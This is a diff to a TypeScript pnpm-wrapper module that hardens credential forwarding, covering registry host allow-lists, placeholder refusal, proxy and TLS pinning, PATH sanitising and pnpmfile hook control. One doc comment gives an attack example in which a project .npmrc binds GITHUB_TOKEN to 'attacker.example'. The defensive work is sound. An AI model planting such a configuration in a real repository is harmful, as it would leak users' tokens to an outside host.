@@ -219,6 +219,45 @@ export type StoreManifest = typeof StoreManifest.Type
 export const storeRoot = ".flows/store"
 
 /**
+ * The project hook files pnpm loads by default, in its own order: the first
+ * one present is the only one loaded.
+ *
+ * The install flow measures that file and every pnpm command names it with
+ * `--pnpmfile`, so a `pnpmfile` or `globalPnpmfile` setting the measurement
+ * never saw cannot add another. With neither present, hooks are disabled.
+ *
+ * @category constants
+ * @since 1.0.0
+ */
+export const pnpmfileNames = [".pnpmfile.mjs", ".pnpmfile.cjs"] as const
+
+/**
+ * The first default pnpm hook file present in a project, if any.
+ *
+ * @category constructors
+ * @since 1.0.0
+ */
+export const pnpmfileOf = (
+  projectRoot: string
+): Effect.Effect<(typeof pnpmfileNames)[number] | null, PackageManagerError, FileSystem.FileSystem> =>
+  Effect.gen(function*() {
+    const fs = yield* FileSystem.FileSystem
+    for (const name of pnpmfileNames) {
+      const present = yield* fs.exists(`${projectRoot}/${name}`).pipe(
+        Effect.mapError((cause) =>
+          new PackageManagerError({
+            code: "manifest_unreadable",
+            message: `cannot inspect ${name}`,
+            cause: Diagnostics.diagnostic(cause)
+          })
+        )
+      )
+      if (present) return name
+    }
+    return null
+  })
+
+/**
  * Maximum bytes admitted from one project `.npmrc` file.
  *
  * @category constants
@@ -364,8 +403,9 @@ export interface Options {
   readonly requirement: string
   /**
    * Host environment capability. Implementations select only process-startup
-   * variables, network routing, and variables explicitly referenced by the
-   * project `.npmrc`; the complete object is never inherited by a child.
+   * variables, network routing, and variables the project `.npmrc` names as the
+   * whole value of a registry-scoped credential setting; the complete object is
+   * never inherited by a child. Relative `PATH` entries are dropped.
    *
    * Because it is the host's environment, its names are held to the host's own
    * rule rather than to the portable one. Windows names `ProgramFiles(x86)`,
@@ -395,7 +435,32 @@ export interface Options {
    * rather than declaring one path and writing another.
    */
   readonly storeDirectory?: string | undefined
+  /**
+   * Registry hosts a project `.npmrc` may bind a host credential to.
+   *
+   * A `//host/path/:_authToken=${NAME}` setting names its own host, and the
+   * repository writes that line. Without this list a checkout could pair
+   * `registry=https://attacker.example/` with
+   * `//attacker.example/:_authToken=${GITHUB_TOKEN}` and pnpm would send the
+   * host variable there. A placeholder under any other host is refused with
+   * `unsafe_configuration` before a child starts. Entries are `host` or
+   * `host:port`, compared case-insensitively against the setting's authority.
+   *
+   * Defaults to {@link defaultCredentialHosts}. An empty list forwards no
+   * credential.
+   */
+  readonly credentialHosts?: ReadonlyArray<string> | undefined
 }
+
+/**
+ * The registry hosts a project `.npmrc` may bind a credential to when
+ * {@link Options.credentialHosts} is omitted.
+ *
+ * @category constants
+ * @since 0.1.0
+ * @slop
+ */
+export const defaultCredentialHosts: ReadonlyArray<string> = Object.freeze(["registry.npmjs.org"])
 
 /** @private */
 const failedToStart = (label: string, cause: unknown): PackageManagerError =>
@@ -502,6 +567,25 @@ interface NormalizedOptions {
   readonly timeoutMs: number
   readonly executable: string | undefined
   readonly storeDirectory: string | undefined
+  readonly credentialHosts: ReadonlySet<string>
+}
+
+/** Validates the operator's credential host list into a lower-cased set. */
+const credentialHostsOf = (value: unknown): ReadonlySet<string> => {
+  if (value === undefined) return new Set(defaultCredentialHosts)
+  if (!Array.isArray(value) || value.length > 64) {
+    throw new TypeError("package-manager credentialHosts must be an array of at most 64 hosts")
+  }
+  const hosts = new Set<string>()
+  for (let index = 0; index < value.length; index += 1) {
+    const descriptor = Object.getOwnPropertyDescriptor(value, String(index))
+    const host = descriptor !== undefined && "value" in descriptor ? descriptor.value : undefined
+    if (typeof host !== "string" || !/^[A-Za-z0-9](?:[A-Za-z0-9.-]{0,251}[A-Za-z0-9])?(?::[0-9]{1,5})?$/.test(host)) {
+      throw new TypeError("package-manager credentialHosts must contain only host or host:port names")
+    }
+    hosts.add(host.toLowerCase())
+  }
+  return hosts
 }
 
 /**
@@ -515,7 +599,15 @@ const normalizeOptions = (value: Options, hostPlatform: Platform): NormalizedOpt
   const options = Validate.plainRecord(value, "package-manager options")
   Validate.exactKeys(
     options,
-    new Set(["projectRoot", "requirement", "environment", "timeoutMs", "executable", "storeDirectory"]),
+    new Set([
+      "projectRoot",
+      "requirement",
+      "environment",
+      "timeoutMs",
+      "executable",
+      "storeDirectory",
+      "credentialHosts"
+    ]),
     "package-manager options"
   )
   const root = Validate.ownData(options, "projectRoot", "package-manager options")
@@ -574,9 +666,22 @@ const normalizeOptions = (value: Options, hostPlatform: Platform): NormalizedOpt
     ),
     timeoutMs,
     executable,
-    storeDirectory: store
+    storeDirectory: store,
+    credentialHosts: credentialHostsOf(Validate.ownData(options, "credentialHosts", "package-manager options"))
   })
 }
+
+/**
+ * Keeps only the absolute directories of a search path.
+ *
+ * A relative or empty entry names the child's cwd, which is the project root:
+ * a repository could plant the executable it resolves to.
+ */
+const absoluteSearchPath = (value: string, windows: boolean): string =>
+  value.split(windows ? ";" : ":").filter((component) => {
+    const directory = windows ? component.replace(/^"(.*)"$/, "$1") : component
+    return windows ? /^(?:\/|[A-Za-z]:[\\/]|\\\\)/.test(directory) : directory.startsWith("/")
+  }).join(windows ? ";" : ":")
 
 /** Variables that can mutate the runtime or package-manager command itself. */
 const unsafeReferencedEnvironmentName = (name: string): boolean =>
@@ -697,11 +802,37 @@ const boundedText = (
     )
   )
 
+/**
+ * `.npmrc` settings that choose where, or how safely, a request travels.
+ *
+ * With a forwarded credential, a repository-chosen proxy receives the
+ * credential (in cleartext for an `http:` registry), and a repository CA or
+ * `strict-ssl=false` lets a server it chose impersonate the allowed host.
+ */
+const transportSetting = /^(?:proxy|https?-proxy|no-?proxy|strict-ssl|ca|cafile|cert|local-address)$/i
+
+/** A `registry` or `@scope:registry` setting. */
+const registrySetting = /^(?:@[^:]+:)?registry$/i
+
+/**
+ * The environment and transport pins a pnpm child runs with.
+ *
+ * `transportArgs` is empty unless `.npmrc` forwards a credential. Then it pins
+ * every proxy, TLS, and CA setting on the command line, which outranks both
+ * `.npmrc` and `pnpm-workspace.yaml` (pnpm 10 reads `httpsProxy`, `httpProxy`,
+ * and `strictSsl` from the latter). The proxies are the operator's own
+ * `HTTPS_PROXY`, `HTTP_PROXY`, and `NO_PROXY`, or none.
+ */
+interface ManagerEnvironment {
+  readonly env: Record<string, string>
+  readonly transportArgs: ReadonlyArray<string>
+}
+
 /** Selects only bootstrap, network, and project-declared credential variables. */
 const managerEnvironment = (
   fs: FileSystem.FileSystem,
   options: NormalizedOptions
-): Effect.Effect<Record<string, string>, PackageManagerError> =>
+): Effect.Effect<ManagerEnvironment, PackageManagerError> =>
   Effect.gen(function*() {
     const source = options.environment
     const path = `${options.projectRoot}/.npmrc`
@@ -713,17 +844,38 @@ const managerEnvironment = (
         ? yield* boundedText(fs, "manifest_unreadable", options.projectRoot, path, maximumNpmrcBytes)
         : ""
     )
-    if (hasEmbeddedNpmCredential(npmrc)) {
-      return yield* Effect.fail(
-        new PackageManagerError({
-          code: "unsafe_configuration",
-          message: `${path} embeds a credential; use an environment-variable placeholder`
-        })
-      )
-    }
+    yield* refuseUnsafeNpmrc(path, npmrc)
+    // After the refusal every live placeholder is the whole value of a
+    // registry-scoped credential setting, so these are the only names a
+    // project `.npmrc` can pull from the host. The setting's host is the
+    // repository's choice, so it must also be one the operator allowed.
     const referenced = new Set<string>()
-    for (const [, value] of npmrc) {
-      for (const match of value.matchAll(/\$\{([A-Za-z_][A-Za-z0-9_]*)\}/g)) referenced.add(match[1]!)
+    for (const [name, value] of npmrc) {
+      const match = /^\$\{([A-Za-z_][A-Za-z0-9_]*)\}$/.exec(value)
+      if (match === null) continue
+      const host = /^\/\/([^/\s]+)\//.exec(name)?.[1]?.toLowerCase()
+      if (host === undefined || !options.credentialHosts.has(host)) {
+        return yield* Effect.fail(
+          new PackageManagerError({
+            code: "unsafe_configuration",
+            message: `${path} setting ${name} binds a credential to a registry host outside credentialHosts`
+          })
+        )
+      }
+      referenced.add(match[1]!)
+    }
+    if (referenced.size > 0) {
+      for (const [name, value] of npmrc) {
+        if (transportSetting.test(name) || (registrySetting.test(name) && !/^https:\/\//i.test(value))) {
+          return yield* Effect.fail(
+            new PackageManagerError({
+              code: "unsafe_configuration",
+              message: `${path} setting ${name} changes how a forwarded credential travels; ` +
+                "with a credential placeholder, registries must be https and proxy and TLS settings come from the host"
+            })
+          )
+        }
+      }
     }
     const windows = options.platform.os === "win32"
     // A null prototype, because the loop below decides what to forward by
@@ -756,7 +908,30 @@ const managerEnvironment = (
       const value = Validate.sourceValue(source, name, windows)
       if (value !== undefined && !Object.hasOwn(env, name)) env[name] = value
     }
-    return env
+    // The child runs with the project root as its cwd, so a relative or empty
+    // `PATH` entry would resolve `pnpm` (and anything pnpm spawns) to a file
+    // the repository planted.
+    // An empty `PATH` is itself one empty entry, so it is removed, not kept.
+    if (Object.hasOwn(env, "PATH")) {
+      const search = absoluteSearchPath(env.PATH!, windows)
+      if (search === "") delete env.PATH
+      else env.PATH = search
+    }
+    if (referenced.size === 0) return { env, transportArgs: [] }
+    const hostValue = (...names: ReadonlyArray<string>) =>
+      names.map((name) => Validate.sourceValue(source, name, windows)).find((value) => value !== undefined) ?? ""
+    const httpsProxy = hostValue("HTTPS_PROXY", "https_proxy")
+    return {
+      env,
+      transportArgs: [
+        "--config.proxy=",
+        `--config.https-proxy=${httpsProxy}`,
+        `--config.http-proxy=${hostValue("HTTP_PROXY", "http_proxy") || httpsProxy}`,
+        `--config.noproxy=${hostValue("NO_PROXY", "no_proxy")}`,
+        "--config.strict-ssl=true",
+        "--config.ca="
+      ]
+    }
   })
 
 /** Constructs a child that receives only explicitly selected capabilities. */
@@ -918,13 +1093,12 @@ const pnpmInvocation = (
         code: "environment_mismatch",
         message: `cannot resolve ${shim} to one pnpm JavaScript entrypoint; provide a native executable override`
       })
-    const path = Validate.sourceValue(options.environment, "PATH", true) ?? ""
+    const path = absoluteSearchPath(Validate.sourceValue(options.environment, "PATH", true) ?? "", true)
     for (const component of path.split(";")) {
-      const directory = component.replace(/^"(.*)"$/, "$1")
-      if (directory === "") continue
-      const absolute = /^(?:\/|[A-Za-z]:[\\/]|\\\\)/.test(directory)
-        ? directory
-        : `${options.projectRoot}/${directory}`
+      // Relative entries were dropped above: resolved against the project
+      // root they would select a repository-planted pnpm.cmd and entrypoint.
+      const absolute = component.replace(/^"(.*)"$/, "$1")
+      if (absolute === "") continue
       const shim = `${absolute}/pnpm.cmd`
       const present = yield* fs.exists(shim).pipe(Effect.mapError(() => mismatch(shim)))
       if (!present) continue
@@ -985,7 +1159,7 @@ export const makePnpm = (options: Options): Effect.Effect<
     ]
     const command = (args: ReadonlyArray<string>, output: "capture" | "inherit") =>
       Effect.gen(function*() {
-        const env = yield* environment
+        const { env } = yield* environment
         const { executable, prefix } = yield* invocation
         return managerCommand(executable, [...prefix, ...args], projectRoot, env, output)
       })
@@ -993,10 +1167,20 @@ export const makePnpm = (options: Options): Effect.Effect<
       Effect.flatMap(command(["--version"], "capture"), (child) => capture(spawner, "pnpm --version", child, timeoutMs))
     )
     const verify = verified("pnpm", normalized.requirement, version)
+    // pnpm also loads a `pnpmfile` or `globalPnpmfile` setting. Naming the
+    // measured default file turns those off; with no default file, hooks are
+    // off entirely.
+    const hookArgs = pnpmfileOf(projectRoot).pipe(
+      Effect.provideService(FileSystem.FileSystem, fs),
+      Effect.map((name) =>
+        name === null ? ["--ignore-pnpmfile"] : ["--pnpmfile", `${projectRoot}/${name}`, "--global-pnpmfile="]
+      )
+    )
     const execute = (label: string, args: ReadonlyArray<string>) =>
       Effect.gen(function*() {
         yield* verify
-        const child = yield* command(args, "inherit")
+        const { transportArgs } = yield* environment
+        const child = yield* command([...args, ...transportArgs, ...(yield* hookArgs), ...storeArgs], "inherit")
         yield* run(spawner, label, child, timeoutMs)
       })
     return Object.freeze(
@@ -1011,7 +1195,7 @@ export const makePnpm = (options: Options): Effect.Effect<
         verify,
         fetch: execute(
           "pnpm fetch",
-          ["fetch", "--frozen-lockfile", "--ignore-scripts", "--reporter=append-only", ...storeArgs]
+          ["fetch", "--frozen-lockfile", "--ignore-scripts", "--reporter=append-only"]
         ),
         link: execute(
           "pnpm install --offline",
@@ -1020,8 +1204,7 @@ export const makePnpm = (options: Options): Effect.Effect<
             "--offline",
             "--frozen-lockfile",
             "--ignore-scripts",
-            "--reporter=append-only",
-            ...storeArgs
+            "--reporter=append-only"
           ]
         ),
         // pnpm records the state of the virtual store it linked from.
@@ -1351,19 +1534,59 @@ export const linkedTreeManifest = (input: {
     return JSON.stringify(["smithers-build/linked-tree-manifest/v1", ...values])
   }).pipe(Effect.flatMap(digestText))
 
-/** Parses live settings once for credential refusal and environment selection. */
+/**
+ * Parses live settings once for credential refusal and environment selection.
+ *
+ * This mirrors the `ini` decoder pnpm 10 reads `.npmrc` with, line for line.
+ * Every check below reads these settings, so any divergence is a place a
+ * setting can hide: a `\r` pnpm treats as a line break, or a quoted value pnpm
+ * decodes with `JSON.parse` (`"\u0024{NAME}"` is `${NAME}` to pnpm). Settings
+ * under an `[section]` header are kept; checking more than pnpm uses is safe.
+ */
 const parseNpmrc = (text: string): Array<readonly [name: string, value: string]> => {
   const settings: Array<readonly [name: string, value: string]> = []
-  for (const raw of text.split("\n")) {
-    const line = raw.trim()
-    if (line.length === 0 || line.startsWith("#") || line.startsWith(";")) continue
-    const separator = line.indexOf("=")
-    if (separator < 0) continue
-    // npm's ini parser strips one layer of surrounding quotes, so a quoted
-    // placeholder grants the same variable as the bare placeholder.
-    settings.push([line.slice(0, separator).trim(), unquoted(line.slice(separator + 1).trim())])
+  for (const line of text.split(/[\r\n]+/)) {
+    if (line.length === 0 || /^\s*[;#]/.test(line)) continue
+    const match = /^\[([^\]]*)\]$|^([^=]+)(=(.*))?$/.exec(line)
+    if (match === null || match[2] === undefined) continue
+    settings.push([iniValue(match[2]), match[3] === undefined ? "true" : iniValue(match[4] ?? "")])
   }
   return settings
+}
+
+/**
+ * Decodes a key or value the way `ini`'s `unsafe` does: a quoted string goes
+ * through `JSON.parse` (single quotes are stripped first), and an unquoted one
+ * ends at the first unescaped `;` or `#`.
+ */
+const iniValue = (raw: string): string => {
+  let value = raw.trim()
+  const quoted = (value.startsWith("\"") && value.endsWith("\"")) || (value.startsWith("'") && value.endsWith("'"))
+  if (quoted) {
+    if (value.startsWith("'")) value = value.slice(1, -1)
+    try {
+      const parsed: unknown = JSON.parse(value)
+      return typeof parsed === "string" ? parsed : JSON.stringify(parsed)
+    } catch {
+      return value
+    }
+  }
+  let escaped = false
+  let decoded = ""
+  for (const character of value) {
+    if (escaped) {
+      decoded += "\\;#".includes(character) ? character : `\\${character}`
+      escaped = false
+    } else if (character === ";" || character === "#") {
+      break
+    } else if (character === "\\") {
+      escaped = true
+    } else {
+      decoded += character
+    }
+  }
+  if (escaped) decoded += "\\"
+  return decoded.trim()
 }
 
 /**
@@ -1398,12 +1621,50 @@ const hasEmbeddedNpmCredential = (settings: ReadonlyArray<readonly [name: string
   })
 }
 
-/** Strips one layer of matching surrounding quotes, the way npm's ini parser does. */
-const unquoted = (value: string): string => {
-  const first = value[0]
-  return (first === "\"" || first === "'") && value.length >= 2 && value.endsWith(first)
-    ? value.slice(1, -1)
-    : value
+/**
+ * Names the first setting whose value carries an environment placeholder
+ * anywhere but as the whole value of a registry-scoped credential setting.
+ *
+ * pnpm expands `${NAME}` in every value. A placeholder in a registry URL, a
+ * proxy, or an unscoped credential (which follows whatever `registry=` says)
+ * would send the host variable to a server the repository chose. A
+ * `//host/:_authToken=${NAME}` setting sends it only to the host its own key
+ * names.
+ *
+ * @private
+ */
+const misplacedPlaceholder = (
+  settings: ReadonlyArray<readonly [name: string, value: string]>
+): string | undefined =>
+  settings.find(([name, value]) =>
+    // pnpm expands placeholders in setting names too.
+    name.includes("${") ||
+    value.includes("${") &&
+      !(/^\/\/\S+:(?:_authToken|_auth|_password|username)$/i.test(name) &&
+        /^\$\{[A-Za-z_][A-Za-z0-9_]*\}$/.test(value))
+  )?.[0]
+
+/** Refuses literal credentials and misplaced placeholders in a project `.npmrc`. */
+const refuseUnsafeNpmrc = (
+  path: string,
+  settings: ReadonlyArray<readonly [name: string, value: string]>
+): Effect.Effect<void, PackageManagerError> => {
+  if (hasEmbeddedNpmCredential(settings)) {
+    return Effect.fail(
+      new PackageManagerError({
+        code: "unsafe_configuration",
+        message: `${path} embeds a credential; use an environment-variable placeholder`
+      })
+    )
+  }
+  const misplaced = misplacedPlaceholder(settings)
+  return misplaced === undefined ? Effect.void : Effect.fail(
+    new PackageManagerError({
+      code: "unsafe_configuration",
+      message: `${path} setting ${misplaced} uses an environment placeholder; placeholders are allowed only as ` +
+        "the whole value of a registry-scoped _authToken, _auth, _password, or username setting"
+    })
+  )
 }
 
 /**
@@ -1429,14 +1690,7 @@ export const npmrcDigest = (
     )
     if (!present) return null
     const text = yield* boundedText(fs, "manifest_unreadable", projectRoot, path, maximumNpmrcBytes)
-    if (hasEmbeddedNpmCredential(parseNpmrc(text))) {
-      return yield* Effect.fail(
-        new PackageManagerError({
-          code: "unsafe_configuration",
-          message: `${path} embeds a credential; use an environment-variable placeholder`
-        })
-      )
-    }
+    yield* refuseUnsafeNpmrc(path, parseNpmrc(text))
     return yield* digestText(text)
   })
 
